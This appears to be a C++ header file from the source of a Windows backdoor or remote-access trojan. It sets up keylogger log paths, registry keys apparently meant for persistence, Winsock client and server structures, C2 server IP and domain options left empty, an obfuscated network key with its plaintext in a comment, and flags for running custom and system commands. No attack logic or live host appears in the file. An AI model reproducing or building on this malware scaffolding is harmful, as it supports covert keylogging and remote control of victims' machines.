#include <iostream>

#ifndef _TOOLSKIT_HPP_
#define _TOOLSKIT_HPP_
#include "toolskit.hpp"
#endif

/**
 * Is the program in development mode
*/
#define REPORTER_DEBUG_MODE

/**
 * Behaves
*/
#define BEHAVES_COUNT 2

static std::string StandardLogPath = getStandardLogPath();
static std::string KeyLogPath = getKeyLoggerLogPath();

/**
 * Registry definitions
*/
#define KEY_TARGET HKEY_LOCAL_MACHINE
#define KEY_NOT_ADMIN_TARGET HKEY_CURRENT_USER

/**
 * Winsock structs
*/
struct ClientInfo
{
    std::string ipAddr;
    int Port;
};

struct ServerInfo
{
    std::string ServerDomainName;
    std::string ServerIp;
    int Port;
};

/**
 * C2 SERVER's ip and domain name
*/
#define IP_ADDR_MODE
// #define DOMAIN_NAME_MODE
#define C2IP
#define C2DM
#define MAX_RECV_BUF 1073741824 // 1GB
// lFOYz8gbu9xbhzzFyBAjUmwlorSypF
static char INET_KEY[] = "\x6c\x47\x4d\x5a\x7e\x3d\x61\x65\x7d\x30\x72\x69\x64\x77\x74\x49\x69\x53\x53\x79\x41\x78\x61\x7b\x77\x6b\x49\x62\x6c\x5b";

/**
 * Command States
*/
typedef std::string RECVDATA;
enum CMDSTATE {
    NOTCMD = -1,
    CUSTCMD = 0, 
    SYSCMD = 1
};